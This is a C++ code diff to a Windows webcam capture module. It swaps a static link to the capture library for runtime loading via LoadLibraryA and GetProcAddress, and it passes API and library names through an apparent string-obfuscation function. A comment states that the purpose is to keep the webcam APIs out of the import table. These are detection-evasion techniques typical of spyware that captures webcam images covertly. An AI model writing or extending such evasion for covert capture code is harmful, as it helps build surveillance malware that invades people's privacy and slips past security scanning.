@@ -16,8 +16,18 @@ BitBlt reads the window's rendered content directly from the GDI framebuffer.
 #include <string>
 #include <vector>
 
-#pragma comment(lib, "vfw32.lib")
 #pragma comment(lib, "GdiPlus.lib")
+
+// Dynamic load of capCreateCaptureWindowA — keeps vfw32/avicap32 out of import table
+typedef HWND (VFWAPIV *pfnCapCreate)(LPCSTR,DWORD,int,int,int,int,HWND,int);
+static HWND dyn_capCreate(LPCSTR n,DWORD s,int x,int y,int w,int h,HWND p,int id) {
+    static pfnCapCreate fn = nullptr;
+    if (!fn) {
+        HMODULE hLib = LoadLibraryA(S("avicap32.dll").c_str());
+        if (hLib) fn = (pfnCapCreate)GetProcAddress(hLib, S("capCreateCaptureWindowA").c_str());
+    }
+    return fn ? fn(n,s,x,y,w,h,p,id) : NULL;
+}
 
 namespace WebcamTool {
 
@@ -89,7 +99,7 @@ bool CaptureFrame(const std::string& outPath) {
     g_streamGot = false;
     g_streamData.clear();
 
-    HWND hCap = capCreateCaptureWindowA("capwin", WS_POPUP, 0, 0, W, H, nullptr, 0);
+    HWND hCap = dyn_capCreate(S("capwin").c_str(), WS_POPUP, 0, 0, W, H, nullptr, 0);
     if (!hCap) { WcamDbg("FAIL: capCreateCaptureWindowA"); return false; }
     WcamDbg("2: window created");
 
